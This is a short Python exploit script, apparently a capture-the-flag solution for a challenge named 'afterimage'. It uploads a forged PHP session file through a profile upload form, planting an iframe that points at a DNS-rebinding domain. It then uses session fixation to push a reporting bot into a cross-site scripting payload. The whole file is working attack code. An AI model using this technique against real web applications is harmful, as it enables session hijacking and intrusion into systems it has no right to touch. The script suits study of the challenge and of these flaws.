import requests
import sys

URL = "http://afterimage.challs.srdnlen.it"
REBINDING_DOMAIN = sys.argv[1]
# prepare session file content
IFRAME = f'<iframe src="{REBINDING_DOMAIN}"></iframe>'
# IFRAME = "FAKE EXPLOIT"
SESSION_CONTENT = f'nickname|s:5:"admin";bio|s:{len(IFRAME)}:"{IFRAME}";theme|s:5:"light";'


# make request to url and extract the php session id
def get_session_id(url=URL):
    response = requests.get(url)
    if response.status_code == 200:
        session_id = response.cookies.get('PHPSESSID')
        return session_id
    else:
        print(f"failed to connect to {url}, exiting")
        return None


# upload session file to exploit xss
def upload_file(filename, content=SESSION_CONTENT):
    files = {'config_file': (filename, content)}
    response = requests.post(URL + "/profile.php", files=files)
    if response.status_code == 200:
        print("file uploaded successfully")
    else:
        print("failed to upload file")


# report url
# perform session fixation to force xss on the bot
def report(url_to_report):
    data = {"url": url_to_report}
    requests.post(URL + "/report", data=data)


if __name__ == "__main__":
    session_id = get_session_id()
    print(f"session id: {session_id}")
    if not session_id:
        print("session id missing, exiting")
        sys.exit(1)
    upload_file(f"sess_{session_id}")
    report(f"http://afterimage-nginx/index.php?PHPSESSID={session_id}")
